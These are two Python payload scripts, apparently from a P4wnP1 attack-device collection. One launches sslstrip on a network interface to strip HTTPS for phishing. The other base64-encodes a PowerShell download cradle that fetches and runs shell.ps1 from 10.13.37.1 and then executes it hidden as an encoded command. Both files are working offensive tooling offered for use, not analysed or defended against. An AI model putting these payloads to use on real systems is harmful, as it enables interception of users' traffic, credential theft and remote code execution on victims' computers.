# File: /opt/p4wnp1/payloads/network/sslstrip_phishing.py
import subprocess
import os

iface = os.environ.get("IFACE", "usb0")

print(f"[*] Starting SSLStrip on interface: {iface}")

try:
    subprocess.run(["sslstrip", "-l", "8080"])
except FileNotFoundError:
    print("[!] sslstrip not found. Please install it first.")
except KeyboardInterrupt:
    print("[!] SSLStrip interrupted.")


# File: /opt/p4wnp1/payloads/hid/autorun_powershell.py
import subprocess
import time

payload = "IEX(New-Object Net.WebClient).DownloadString('http://10.13.37.1/shell.ps1')"
encoded = subprocess.check_output([
    "powershell",
    "-NoProfile",
    "-Command",
    f"[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"{payload}\"))"
]).decode().strip()

print("[*] Launching PowerShell autorun payload")

try:
    subprocess.run(["powershell", "-NoProfile", "-EncodedCommand", encoded])
except Exception as e:
    print(f"[!] Failed to launch payload: {e}")
